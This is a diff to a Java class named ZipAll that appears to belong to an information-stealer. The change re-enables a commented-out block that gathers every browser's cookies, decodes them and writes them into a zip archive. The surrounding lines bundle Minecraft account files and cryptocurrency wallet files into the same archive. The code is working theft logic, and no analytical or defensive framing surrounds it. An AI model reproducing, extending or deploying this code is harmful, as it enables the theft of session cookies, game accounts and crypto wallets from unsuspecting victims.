@@ -42,13 +42,13 @@ public class ZipAll {
                 File minecraftAccounts = entry.getValue();
                 addToZip(zos, minecraftFolder, minecraftAccounts);
             }
-         //   Map<String, String> browserCookies = util.getAllBrowserCookies();
-       //     for (Map.Entry<String, String> entry : browserCookies.entrySet()) {
-       //         String browserFolder = "Browsers/Cookies/" + entry.getKey() + ".txt";
-       //         String encodedCookieData = entry.getValue();
-        //        byte[] cookieData = Base64.getDecoder().decode(encodedCookieData);
-     //           addEntry(zos, browserFolder, cookieData);
-        //    }
+           Map<String, String> browserCookies = util.getAllBrowserCookies();
+           for (Map.Entry<String, String> entry : browserCookies.entrySet()) {
+               String browserFolder = "Browsers/Cookies/" + entry.getKey() + ".txt";
+               String encodedCookieData = entry.getValue();
+               byte[] cookieData = Base64.getDecoder().decode(encodedCookieData);
+               addEntry(zos, browserFolder, cookieData);
+           }
             Map<String, File> wallets = w.getAllFiles();
             for (Map.Entry<String, File> entry : wallets.entrySet()) {
                 String Wallets = "Wallets/" + entry.getKey();
